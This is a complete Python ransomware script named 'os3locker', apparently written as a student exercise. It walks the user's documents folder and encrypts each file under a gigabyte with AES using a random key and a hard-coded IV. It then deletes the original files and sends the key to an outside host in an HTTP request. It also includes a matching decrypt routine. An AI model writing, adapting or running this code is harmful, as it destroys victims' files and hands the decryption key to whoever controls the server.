#!/bin/python3
print("Welcome to the os3locker, a very advanced, cross platform crypto locker for all systems")

import os, struct
import http.client
from time import sleep
from Crypto.Cipher import AES
from Crypto.Random import random

dir_names = []
file_names = []

gb_in_bytes = 10 ** 9

def decrypt_file(name, key):
    iv = "OS3cyptoIVsecret"
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    with open(name, 'rb') as fi:
        with open(name + ".dec", 'wb') as fo:        
            origsize = struct.unpack('<Q', fi.read(struct.calcsize('Q')))[0]
            while True:
                chunk = fi.read(65536)
                if len(chunk) == 0:
                    break
                fo.write(encryptor.decrypt(chunk))
            fo.truncate(origsize)


def encrypt_file(name, key):
   
    iv = "OS3cyptoIVsecret"
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    try:
        length = os.path.getsize(name)
        if length < gb_in_bytes:
            with open(name, 'rb') as fi:
                with open(name + ".os3", 'wb') as fo:
                    fo.write(struct.pack('<Q', length))
                    while True:
                        chunk = fi.read(65536)
                        if len(chunk) == 0:
                            print("Done with", name)
                            break
                        while len(chunk) % 16 != 0:
                            chunk += b"A"
                        fo.write(encryptor.encrypt(chunk))
            f = open(name, 'rb')
            f.close()
        else:
            print(name, "To large for potato encryption")
    except (PermissionError, FileNotFoundError) as e:
        print(str(e))
        pass

for dirname, dirnames, filenames in os.walk('%homepath%/documents'):
    # print path to all subdirectories first.
    for subdirname in dirnames:
        dir_names.append(os.path.join(dirname, subdirname))

    # print path to all filenames.
    for filename in filenames:
        file_names.append(os.path.join(dirname, filename))

key = random.long_to_bytes(random.getrandbits(256))

for file_name in file_names:
    encrypt_file(file_name, key) 

for file_name in file_names:
    os.remove(file_name)

conn = http.client.HTTPConnection("desktop-38.students.os3.nl", 80)
conn.request("HEAD", "/index.html?key=" + str(key.hex()))
conn.close()

